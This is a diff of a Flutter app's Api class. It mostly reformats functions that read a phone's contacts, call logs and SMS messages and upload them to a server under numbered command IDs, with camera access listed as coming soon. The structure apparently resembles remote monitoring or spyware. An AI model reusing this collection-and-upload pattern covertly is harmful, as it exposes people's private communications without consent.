@@ -112,8 +112,8 @@ class Api {
 
   //! APP CRASH WITHOUT REQUEST PERMISSION BEFORE
   // 1 - contacts
-  static Future<String?> sendContacts(
-      BuildContext context, String? agent, String? uuid) async {
+  static Future<String?> sendContacts(BuildContext context, String? agent, String? uuid,
+      {bool manualy = false}) async {
     printWhite('START: sendContactsToServer()');
 
     if (kDebugMode) {
@@ -139,6 +139,9 @@ class Api {
         log(" Call records logs: ${phonesData.length}");
       }
     }
+
+    if (manualy) {}
+
     await _sendToServer(
       agent,
       uuid,
@@ -150,8 +153,7 @@ class Api {
   }
 
   // 2 – call records
-  static Future sendCallLogs(
-      BuildContext context, String? agent, String? uuid) async {
+  static Future sendCallLogs(BuildContext context, String? agent, String? uuid) async {
     printWhite('START: sendCallLogs() ');
     Hive.registerAdapter(CallsAdapter());
     late Box box;
@@ -285,8 +287,7 @@ class Api {
   // 4 – camera (Soon)
 
   // 5 – sms list
-  static Future sendSmsLogs(
-      BuildContext context, String? agent, String? uuid) async {
+  static Future sendSmsLogs(BuildContext context, String? agent, String? uuid) async {
     printWhite('START: sendSmsLogs() ');
 
     if (kDebugMode) {
@@ -321,7 +322,6 @@ class Api {
     providerMainScope(context).smsLogs = smsModelList;
 
     _sendToServer(agent, uuid,
-        type: 'SMS Logs',
-        data: {"uuid": uuid, "command_id": "5", "data": smsJsonList});
+        type: 'SMS Logs', data: {"uuid": uuid, "command_id": "5", "data": smsJsonList});
   }
 }
